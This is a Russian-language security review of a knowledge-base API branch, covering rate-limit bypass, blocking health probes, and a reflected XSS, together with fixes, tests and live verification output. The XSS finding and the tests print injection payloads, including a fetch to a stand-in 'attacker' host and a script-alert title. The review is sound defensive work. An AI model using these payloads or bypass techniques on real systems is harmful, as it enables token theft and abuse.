# Ревью безопасности K6 (ops hardening: rate-limit, security-заголовки, readiness) — 29.09.2026

Объект: ветка `feature/corp-ai-kb-ops`, коммит `0df8c2e` (база `d290963`) —
rate-limit фасада (скользящее окно, `VELES_RATE_LIMIT_RPM`), security-заголовки
`/tracker`, readiness `/healthz`/`/readyz`, TLS-профиль кита (caddy). Проверялись
`veles/api/ratelimit.py`, `veles/api/app.py` (readiness и HTML-страницы),
`deploy/kit/` (compose-профиль `tls`).

## Вердикт: PASS_С_ЗАМЕЧАНИЯМИ (P0 нет)

Фиксы — в этом же eval, ниже (раздел «Фиксы (тот же заход)»).

## Находки

- **[P1] `_index_loaded()` берёт `_pipeline_lock` — пробы блокируются загрузкой
  индекса.** `veles/api/app.py` (~499-504): `/healthz` и `/readyz` захватывают
  тот же лок, что `_pipeline()`, и блокируются на всё время загрузки индекса
  (минуты) — проба висит вместо честного `index_loaded: false`. Docker
  healthcheck (timeout 3s) объявит фасад unhealthy, а open-webui с
  `depends_on: service_healthy` не стартует. Фикс: читать
  `state.get("pipeline") is not None` без лока (атомарное чтение dict под GIL),
  лок остаётся только в `_pipeline()`.
- **[P1] `_bucket_key`: лимит обходится ротацией запросных строк, память растёт
  монотонно.** `veles/api/ratelimit.py` (~71-91): (а) ключ бакета берётся из
  query-параметра `sig` — случайная строка из запроса, каждый запрос даёт новый
  бакет, ротацией `?sig=` обходится ЛЮБОЙ лимит на любом маршруте; брутфорс
  bearer тоже не лимитируется (каждый новый токен = свой бакет). (б) `self._hits`
  растёт монотонно: пустые deque не вытесняются никогда — флуд случайными
  sig/Bearer/email = память. Фикс: в ключ — только ВАЛИДИРОВАННОЕ (bearer
  сравнивается с `state["token"]`: совпал — стабильный бакет владельца, не
  совпал — общий бакет «bad-token»; `sig` из ключа убрать вовсе, фолбэк `ip:`;
  identity из заголовков — как раньше); вытеснение — при достижении порога
  размера dict свипать бакеты, чьё окно истекло.
- **[P2] Reflect-XSS на `/v1/source` (pre-existing).** `veles/api/app.py`
  (~424-497): HTML собирается f-строками БЕЗ `html.escape` (title, heading_path,
  текст узлов, document_id); query-параметр `node` вставляется в инлайн-JS без
  экранирования — `/v1/source/<doc>?sig=<валидная>&node=';fetch('//attacker/')`
  исполняет JS; в static-режиме ссылка с `token=` в query уязвима — JS читает
  `location.search` и уводит эквивалент bearer. Фикс (минимальный, без редизайна
  ссылок): `html.escape` всех текстовых интерполяций; строгая валидация `node`
  (`re.fullmatch(r"[\w.-]+", node)`, иначе 400 — JS-инъекция через node
  невозможна в принципе); тот же набор заголовков, что на `/tracker` (nosniff,
  DENY, no-referrer); CSP с честным `script-src 'unsafe-inline'` — единственный
  инлайн-скрипт страницы (скролл к анкеру), редизайн на #fragment-навигацию —
  отдельная задача.
- **[P2] Докстринг ratelimit не фиксирует ограничение ip-фолбэка.** За
  reverse-proxy (caddy) ip-фолбэк видит один IP → общий бакет анонимов; XFF не
  доверяем (спуфинг) — задокументировать как известное ограничение.
- **[P2] Правки eval фазы K6** (`2026-09-29-corp-ai-kb-k6-ops.md`): «8 шт.»
  вместо 10 в описании тестов `tests/test_ops.py`; персональный путь
  `<server-home>/veles-venv` вместо ролевого «venv стенд».

## Признано корректным (обходов не найдено)

Скользящее окно и Retry-After (расчёт по самому старому попаданию окна)
корректны; `/healthz`/`/readyz` вне лимита — обоснованно (проба, отвалившаяся по
429, читается как сбой); заголовки и строгий CSP `/tracker` корректны (инлайнов
на странице нет); `/tracker/file` отдаёт `text/plain` и в identity-режиме честно
401 анониму; подписанные ссылки — HMAC + `compare_digest`, не-ASCII sig даёт
4xx, не 500; выключение лимита (`0`/мусор) и щедрый дефолт соответствуют брифу.

## Фиксы (тот же заход)

Ветка `feature/corp-ai-kb-ops`, коммиты `7bc973a` (P1-1, P1-2, P2-4), `3ee60a0`
(P2-3), документ-коммит этого eval (P2-5 и этот раздел). Публичные контракты не
менялись; единственное расширение — `/v1/source` отдаёт 400 на невалидный `node`
(раньше — 200 с инъекцией). Прогон — стенд (Ubuntu, venv стенд), код
`git archive HEAD | ssh стенд "tar -x -C /tmp/veles-k6-fix"`; прод стенд не тронут
(живой фасад :8400 владельца не затрагивался); тест-инстанс :18420 и /tmp
вычищены (leftover-процессов и каталогов нет).

| Находка | Коммит | Чем доказано |
|---|---|---|
| P1-1 пробы блокируются локом | `7bc973a` | `test_healthz_not_blocked_while_index_loads`: `with TestClient(app)` запускает lifespan, warmup-поток держит `_pipeline_lock` на замонkeypatchенной медленной `load_index`; `/healthz` отвечает < 2 c с `index_loaded: false`, `/readyz` — 503. Регрессия (лок в `_index_loaded`) висела бы до конца загрузки (~10 c) и падала бы по assert'у времени |
| P1-2(а) ротация sig, брутфорс | `7bc973a` | юнит: `_bucket_key` при разных `?sig=` даёт один ключ (`ip:`), 10 невалидных bearer + невалидный `token=` — один ключ `tok:bad`, валидный bearer/`token=` — стабильный `tok:<sha256>`; HTTP-негативы: ротация `?sig=` при RPM=2 → 3-й запрос 429, 4 разных невалидных bearer при RPM=3 → 4-й 429 |
| P1-2(б) монотонный рост памяти | `7bc973a` | `test_limiter_sweeps_expired_buckets`: 10 000 бакетов (MAX_KEYS), следующий hit свипает истёкшие окна (`len(_hits)` падает, свежий ключ остаётся); свип не чаще раза за окно — задокументировано в докстринге модуля |
| P2-3 reflect-XSS `/v1/source` | `3ee60a0` | тесты: title/heading_path/текст с `<script>`/`<b>`/`<img onerror>` экранируются (`&lt;script&gt;` в теле, сырого payload нет), `node="';fetch('//attacker')//"` → 400 при рабочем валидном `node` (скролл к анкеру сохранён), nosniff/DENY/no-referrer и CSP на странице; живой негатив стенд — ниже |
| P2-4 докстринг ip-фолбэка | `7bc973a` | в докстринге модуля: ключ только из валидированного; ip-фолбэк за reverse-proxy (caddy) — один бакет анонимов, XFF не доверяем (спуфинг) |
| P2-5 правки eval фазы | этот коммит | «8 шт.» → 10 в описании тестов test_ops.py (счёт на коммите фазы `0df8c2e`); `<server-home>/veles-venv` → «venv стенд» (2 места) |

Вывод полного сета (стенд, /tmp/veles-k6-fix):

```
$ git archive HEAD | ssh стенд "rm -rf /tmp/veles-k6-fix && mkdir -p /tmp/veles-k6-fix && tar -x -C /tmp/veles-k6-fix"
$ cd /tmp/veles-k6-fix && CUDA_VISIBLE_DEVICES= python -m pytest tests -q   (venv стенд)
→ 143 passed, 1 warning in 7.17s   (было 134, +9 новых: 6 в tests/test_ops.py, 3 в tests/test_source_links.py)
```

Локальный Windows-хост: `python -m pytest tests -q` → 142 passed, 1 skipped
(skipped — платформенный, не из ревью; 143 vs 142+1 — разница окружений, не кода).

Живой негатив (стенд, тест-инстанс :18420, RPM=3, tmp VELES_DATA/TRACKER_ROOT,
фикстура канона с title-пейлоадом `<script>alert('xss')</script>`):

```
$ curl -I http://127.0.0.1:18420/tracker
  → 200, x-content-type-options: nosniff, x-frame-options: DENY,
    referrer-policy: no-referrer,
    content-security-policy: default-src 'none'; frame-ancestors 'none'; base-uri 'none'; form-action 'none'
$ curl http://127.0.0.1:18420/v1/source/lectures/x.txt
  → 200, тот же набор заголовков, CSP со script-src 'unsafe-inline' (инлайн-скрипт скролла);
    экранирование в теле: <title>Живой документ &lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</title>
$ curl "…/v1/source/lectures/x.txt?node=';fetch('//attacker')//"
  → 400 bad node
$ 4-й лимитируемый запрос: GET /v1/models → 429 + retry-after: 60 (ключ ip:, ротация не влияет)
$ /readyz → 503 {"status":"starting","index_loaded":false}; /healthz → 200 (вне лимита, мгновенно)
```

## Замечания вне фиксов

- `curl -I /v1/source/...` → 405: маршрут объявлен только на GET (HEAD в фазе K6
  добавлялся только `/tracker`). На негативы фикса не влияет — заголовки
  проверены GET-запросом (`curl -s -D -`). Добавить HEAD там или нет — решение
  владельца, в список находок не входило.
- CSP `/v1/source` содержит `script-src 'unsafe-inline'` — честный компромисс:
  единственный инлайн-скрипт (скролл к анкеру `node`, сам `node` провалидирован
  `[\w.-]+`); редизайн на `#fragment`-навигацию — отдельная задача, целью фикса
  было убрать XSS, не переработать страницу.
- Windows-хост: `tests/test_tracker.py::test_concurrent_create_two_threads`
  флапнул одним прогоном (PermissionError при os.replace — прецедент задокументирован
  в eval K2, «Замечания вне фиксов»); перепрогон зелёный, на стенд флапов нет.

